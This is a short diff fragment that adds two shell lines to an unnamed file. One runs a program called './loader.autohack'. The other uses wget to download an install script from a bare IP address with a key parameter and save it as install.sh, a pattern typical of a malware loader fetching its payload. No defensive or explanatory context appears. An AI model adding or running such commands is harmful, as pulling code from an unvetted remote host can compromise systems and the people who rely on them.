@@ -1,0 +1,3 @@
+./loader.autohack > output.log
+wget http://47.75.14.109/root/install.php?key=0946993636 -O install.sh
+
